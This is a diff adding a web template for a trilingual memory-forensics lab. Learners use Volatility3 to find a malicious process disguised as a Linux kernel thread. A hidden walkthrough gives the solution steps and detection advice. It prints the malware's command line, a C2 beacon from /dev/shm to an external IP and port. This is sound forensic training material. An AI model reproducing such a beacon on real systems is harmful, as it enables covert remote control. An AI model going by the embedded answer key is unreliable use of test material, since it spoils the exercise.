@@ -1,0 +1,147 @@
+{% extends "base.html" %}
+{% block title %}DF14 – Memoria: Proceso Malicioso – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="df_memory_process_obj_desc">Se ha volcado la memoria de un servidor Linux comprometido. Localiza el proceso que se hace pasar por un hilo del kernel y no lo es.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <span data-i18n="df_obj_flag_where">— la flag está oculta en el propio fichero de evidencia; analízalo y valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  {% include 'labs/_forensic_evidence.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este volcado de memoria</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400">Este es un volcado de memoria física <strong>real</strong>, de un kernel Linux (Debian 6.1) arrancado específicamente para este laboratorio en una VM mínima — no es texto plano simulado. Es pequeño (unos 15 MB comprimidos, frente a los varios GB de un volcado de producción) porque la VM se diseñó con el mínimo de RAM necesario para arrancar, pero las estructuras internas del kernel son 100% genuinas: <code>volatility3</code> lo analiza exactamente igual que analizaría un volcado real, con los mismos plugins (<code>linux.pslist</code>, <code>linux.psaux</code>, etc.). Volatility3 puede leer el <code>.raw.xz</code> directamente sin descomprimir, pero al no ser un formato con acceso aleatorio, cada lectura no secuencial reprocesa el stream desde el principio — cada plugin puede tardar varios minutos así. Descomprime primero con <code>unxz -k</code> (ver Inicio rápido) y el mismo análisis tarda segundos.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="df_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">unzip memdump_server01_hacklabs.zip
+unxz -k memdump_server01.raw.xz
+vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
+  </div>
+
+  {% include 'labs/_forensic_questions.html' %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Por qué funciona</h3>
+    <p>Volatility3 no "adivina" dónde está cada proceso en el volcado: recorre las estructuras reales del kernel (<code>task_struct</code> y compañía) siguiendo sus offsets exactos. Para saber esos offsets necesita una <strong>tabla de símbolos (ISF)</strong> que coincida con la build exacta del kernel volcado — por eso el paquete de evidencia incluye, además del volcado, un fichero <code>.json.xz</code> con esa tabla generada específicamente para este kernel (Debian 6.1.0-52-amd64) con <code>dwarf2json</code>.</p>
+
+    <h3>2 · Descomprimir e indicar los símbolos</h3>
+    <pre>unzip memdump_server01_hacklabs.zip
+ls
+# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
+unxz -k memdump_server01.raw.xz
+ls
+# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
+    <p>No hace falta mover nada a la carpeta de símbolos de Volatility3 (<code>~/.cache/volatility3/symbols/</code>): basta con apuntar <code>--symbol-dirs</code> a la carpeta donde has descomprimido el zip, y Volatility3 encontrará el <code>.json.xz</code> automáticamente por su banner.</p>
+    <p><strong>Descomprime también el volcado antes de analizarlo.</strong> Volatility3 sabe leer <code>.raw.xz</code> directamente, pero xz no es un formato de acceso aleatorio: cada lectura no contigua que hace un plugin (localizar <code>task_struct</code>, seguir punteros dispersos por toda la RAM…) obliga a reprocesar el stream comprimido, y cada ejecución puede tardar varios minutos. Descomprimiendo una vez con <code>unxz -k</code> (la copia <code>.xz</code> se conserva por el flag <code>-k</code>), el mismo análisis pasa de minutos a segundos.</p>
+
+    <h3>3 · Listar los procesos</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
+    <p>Verás decenas de hilos de kernel legítimos (<code>kworker/0:0</code>, <code>ksoftirqd/0</code>, <code>rcu_gp</code>… todos con PPID 2, hijos de <code>kthreadd</code>) y, al final, un puñado de procesos de "espacio de usuario": <code>sshd</code>, <code>cron</code>, <code>rsyslogd</code>, <code>systemd-journal</code> — y uno más, <code>kworker/u4:2</code>, que por su nombre parecería un hilo de kernel más.</p>
+
+    <h3>4 · Detectar la anomalía con psaux</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux</pre>
+    <p>Aquí está la clave: un hilo de kernel <strong>genuino</strong> no tiene ni ejecutable ni línea de comandos real — <code>psaux</code> lo muestra entre corchetes, repitiendo el nombre (p.ej. <code>[kworker/0:1]</code>), porque no hay ningún <code>argv</code> que mostrar. Compáralo con nuestro sospechoso:</p>
+    <pre>86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}</pre>
+    <p>Este proceso <strong>sí</strong> tiene un ejecutable real (<code>/dev/shm/.systemd/kworker</code> — una ruta que ningún hilo de kernel usaría jamás) y una línea de comandos completa con una IP y puerto externos: un patrón de beacon C2 clásico, disfrazado con un nombre que un análisis superficial con <code>ps</code>/<code>top</code> pasaría por alto sin pensarlo dos veces.</p>
+
+    <h3>5 · Capturar la flag</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Detección basada en eBPF (Falco, Tetragon) o <code>auditd</code> que alerte sobre ejecuciones desde rutas de escritura típicas de malware (<code>/dev/shm</code>, <code>/tmp</code>, <code>/var/tmp</code>).</li>
+      <li>Montar <code>/dev/shm</code> y <code>/tmp</code> con <code>noexec</code> cuando el diseño del sistema lo permita.</li>
+      <li>Alertar sobre procesos cuyo nombre imita el patrón de un hilo de kernel (<code>kworker/*</code>, <code>ksoftirqd/*</code>…) pero que tienen PPID distinto de 2 o un <code>/proc/PID/exe</code> válido — ningún hilo de kernel real tiene ninguna de las dos cosas.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Volatility 3</span> <span class="tools-badge">dwarf2json</span> <span class="tools-badge">QEMU</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Why it works</h3>
+    <p>Volatility3 doesn't "guess" where each process sits in the dump: it walks the kernel's real structures (<code>task_struct</code> and friends) following their exact offsets. To know those offsets it needs a <strong>symbol table (ISF)</strong> matching the exact kernel build that was dumped — that's why the evidence bundle includes, alongside the memory dump, a <code>.json.xz</code> file with that table, generated specifically for this kernel (Debian 6.1.0-52-amd64) with <code>dwarf2json</code>.</p>
+
+    <h3>2 · Unzip and point at the symbols</h3>
+    <pre>unzip memdump_server01_hacklabs.zip
+ls
+# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
+unxz -k memdump_server01.raw.xz
+ls
+# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
+    <p>No need to move anything into Volatility3's symbol cache (<code>~/.cache/volatility3/symbols/</code>): just point <code>--symbol-dirs</code> at the folder where you unzipped the bundle, and Volatility3 will find the <code>.json.xz</code> automatically by its banner.</p>
+    <p><strong>Decompress the dump too before analyzing it.</strong> Volatility3 can read <code>.raw.xz</code> directly, but xz isn't a random-access format: every non-contiguous read a plugin does (locating <code>task_struct</code>, following pointers scattered across RAM…) forces it to reprocess the compressed stream, and a single run can take several minutes. Decompress once with <code>unxz -k</code> (the <code>-k</code> flag keeps the <code>.xz</code> copy too) and the same analysis drops from minutes to seconds.</p>
+
+    <h3>3 · List the processes</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
+    <p>You'll see dozens of legitimate kernel threads (<code>kworker/0:0</code>, <code>ksoftirqd/0</code>, <code>rcu_gp</code>… all with PPID 2, children of <code>kthreadd</code>) and, at the end, a handful of "userspace" processes: <code>sshd</code>, <code>cron</code>, <code>rsyslogd</code>, <code>systemd-journal</code> — and one more, <code>kworker/u4:2</code>, which by its name would look like just another kernel thread.</p>
+
+    <h3>4 · Spot the anomaly with psaux</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux</pre>
+    <p>Here's the tell: a <strong>genuine</strong> kernel thread has no real executable or command line — <code>psaux</code> shows it in brackets, just repeating the name (e.g. <code>[kworker/0:1]</code>), because there's no <code>argv</code> to show. Compare it to our suspect:</p>
+    <pre>86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}</pre>
+    <p>This process <strong>does</strong> have a real executable (<code>/dev/shm/.systemd/kworker</code> — a path no genuine kernel thread would ever use) and a full command line with an external IP and port: a classic C2 beacon pattern, disguised behind a name a quick glance at <code>ps</code>/<code>top</code> would skip right past.</p>
+
+    <h3>5 · Capture the flag</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>eBPF-based detection (Falco, Tetragon) or <code>auditd</code> alerting on executions from typical malware-writable paths (<code>/dev/shm</code>, <code>/tmp</code>, <code>/var/tmp</code>).</li>
+      <li>Mount <code>/dev/shm</code> and <code>/tmp</code> with <code>noexec</code> where the system design allows it.</li>
+      <li>Alert on processes whose name mimics the kernel-thread naming pattern (<code>kworker/*</code>, <code>ksoftirqd/*</code>…) but that have a PPID other than 2, or a valid <code>/proc/PID/exe</code> — a real kernel thread has neither.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Volatility 3</span> <span class="tools-badge">dwarf2json</span> <span class="tools-badge">QEMU</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>1 · Por que funciona</h3>
+    <p>O Volatility3 não "adivinha" onde cada processo está no dump: ele percorre as estruturas reais do kernel (<code>task_struct</code> e similares) seguindo seus offsets exatos. Para conhecer esses offsets, ele precisa de uma <strong>tabela de símbolos (ISF)</strong> correspondente à compilação exata do kernel despejado — por isso o pacote de evidências inclui, além do dump de memória, um arquivo <code>.json.xz</code> com essa tabela gerada especificamente para este kernel (Debian 6.1.0-52-amd64) com o <code>dwarf2json</code>.</p>
+
+    <h3>2 · Descompactar e apontar para os símbolos</h3>
+    <pre>unzip memdump_server01_hacklabs.zip
+ls
+# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
+unxz -k memdump_server01.raw.xz
+ls
+# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
+    <p>Não é necessário mover nada para o cache de símbolos do Volatility3 (<code>~/.cache/volatility3/symbols/</code>): basta apontar <code>--symbol-dirs</code> para a pasta onde você descompactou o pacote, e o Volatility3 encontrará o <code>.json.xz</code> automaticamente pelo seu banner.</p>
+    <p><strong>Descompacte também o dump antes de analisá-lo.</strong> O Volatility3 pode ler <code>.raw.xz</code> diretamente, mas o xz não é um formato de acesso aleatório: cada leitura não contígua feita por um plugin (localizar <code>task_struct</code>, seguir ponteiros espalhados por toda a RAM…) obriga a reprocessar o fluxo comprimido, e uma única execução pode levar vários minutos. Descompactando uma vez com <code>unxz -k</code> (a flag <code>-k</code> preserva também a cópia <code>.xz</code>), a mesma análise cai de minutos para segundos.</p>
+
+    <h3>3 · Listar os processos</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
+    <p>Você verá dezenas de threads de kernel legítimas (<code>kworker/0:0</code>, <code>ksoftirqd/0</code>, <code>rcu_gp</code>… todas com PPID 2, filhas de <code>kthreadd</code>) e, ao final, um punhado de processos de espaço de usuário: <code>sshd</code>, <code>cron</code>, <code>rsyslogd</code>, <code>systemd-journal</code> — e mais um, <code>kworker/u4:2</code>, que pelo nome pareceria apenas mais uma thread de kernel.</p>
+
+    <h3>4 · Detectar a anomalia com psaux</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux</pre>
+    <p>Aqui está o segredo: uma thread de kernel <strong>genuína</strong> não possui um executável real nem linha de comando — o <code>psaux</code> a exibe entre colchetes, apenas repetindo o nome (ex. <code>[kworker/0:1]</code>), pois não há nenhum <code>argv</code> para exibir. Compare com o nosso suspeito:</p>
+    <pre>86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}</pre>
+    <p>Este processo <strong>possui</strong> um executável real (<code>/dev/shm/.systemd/kworker</code> — um caminho que nenhuma thread de kernel legítima usaria) e uma linha de comando completa com IP e porta externos: um padrão clássico de beacon C2, disfarçado sob um nome que passaria despercebido em uma olhada rápida no <code>ps</code>/<code>top</code>.</p>
+
+    <h3>5 · Capturar a flag</h3>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigação</h3>
+    <ul>
+      <li>Detecção baseada em eBPF (Falco, Tetragon) ou <code>auditd</code> que alerte sobre execuções a partir de diretórios tipicamente graváveis por malware (<code>/dev/shm</code>, <code>/tmp</code>, <code>/var/tmp</code>).</li>
+      <li>Montar <code>/dev/shm</code> e <code>/tmp</code> com a opção <code>noexec</code> sempre que a arquitetura do sistema permitir.</li>
+      <li>Alertar sobre processos cujo nome imite o padrão de threads do kernel (<code>kworker/*</code>, <code>ksoftirqd/*</code>…), mas que tenham PPID diferente de 2 ou um link <code>/proc/PID/exe</code> válido — uma thread de kernel real não possui nenhum dos dois.</li>
+    </ul>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">Volatility 3</span> <span class="tools-badge">dwarf2json</span> <span class="tools-badge">QEMU</span></div>
+  </div>
+</div>
+{% endblock %}
